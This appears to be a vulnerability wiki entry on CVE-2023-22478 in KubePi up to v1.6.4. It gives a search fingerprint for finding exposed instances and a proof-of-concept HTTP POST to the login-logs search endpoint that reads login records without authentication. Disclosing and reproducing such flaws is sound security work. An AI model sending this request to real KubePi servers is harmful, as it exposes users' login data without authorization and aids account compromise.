# KubePi LoginLogsSearch Unauthorized Access Vulnerability CVE-2023-22478

## Vulnerability Description

The interface under the KubePi LoginLogsSearch method has an unauthorized access vulnerability. The attacker can obtain the user's login log information without authorization, further breaking the user.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">KubePi <= v1.6.4</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">"kubepi"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1682440791240-01629ee9-05d4-4eff-a15f-aede8707d482.png)

Authentication was added to the route in the patch

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1682440845494-1d058852-8474-4681-bd3e-6b1545000a75.png)

The corresponding interface is

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1682440907690-5156d5b7-4e4d-4a33-9d79-7d489e0411a9.png)



Verify POC

```php
POST /kubepi/api/v1/systems/login/logs/search?pageNum=1&&pageSize=10 HTTP/1.1
Content-Type: application/json

{}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1682440828484-ab47f1ea-42c1-4ec1-af79-0832a6e277ad.png)